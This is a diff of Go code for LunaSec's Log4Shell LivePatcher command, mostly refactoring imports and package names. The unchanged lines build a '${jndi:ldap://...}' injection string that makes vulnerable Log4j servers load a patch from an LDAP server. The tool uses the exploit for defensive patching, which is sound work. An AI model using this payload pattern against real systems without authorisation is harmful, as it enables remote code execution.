@@ -12,30 +12,30 @@
 // See the License for the specific language governing permissions and
 // limitations under the License.
 //
-package commands
+package livepatch
 
 import (
 	"embed"
 	"fmt"
+	"github.com/rs/zerolog/log"
+	"github.com/urfave/cli/v2"
+	"lunasec/lunatrace/pkg/command"
 	"lunasec/lunatrace/pkg/constants"
 	"lunasec/lunatrace/pkg/patch"
 	"lunasec/lunatrace/pkg/util"
-	"github.com/rs/zerolog/log"
-	"github.com/urfave/cli/v2"
 )
 
 func LivePatchCommand(c *cli.Context, globalBoolFlags map[string]bool, hotpatchFiles embed.FS) error {
-	enableGlobalFlags(c, globalBoolFlags)
+	command.EnableGlobalFlags(c, globalBoolFlags)
 
 	payloadUrl := c.String("payload-url")
 	ldapHost := c.String("ldap-host")
 	ldapPort := c.Int("ldap-port")
 
 	log.Info().Msg("LunaSec Log4Shell LivePatcher starting")
-	readMe :=  util.Colorize(constants.ColorRed, "Read our blog post about this tool and its risks")
+	readMe := util.Colorize(constants.ColorRed, "Read our blog post about this tool and its risks")
 	blogLink := util.Colorize(constants.ColorBlue, "https://www.lunasec.io/docs/blog/log4shell-live-patch/")
 	log.Info().Msg(fmt.Sprintf("%s: %s", readMe, blogLink))
-
 
 	if payloadUrl == "" {
 		log.Info().
@@ -63,7 +63,7 @@ func LivePatchCommand(c *cli.Context, globalBoolFlags map[string]bool, hotpatchF
 
 	payload := fmt.Sprintf("${jndi:ldap://%s:%d/a}", ldapHost, ldapPort)
 
-	hotpatchServer := patch.NewHotpatchLDAPServer(
+	hotpatchServer := NewHotpatchLDAPServer(
 		ldapPort,
 		payloadUrl,
 	)
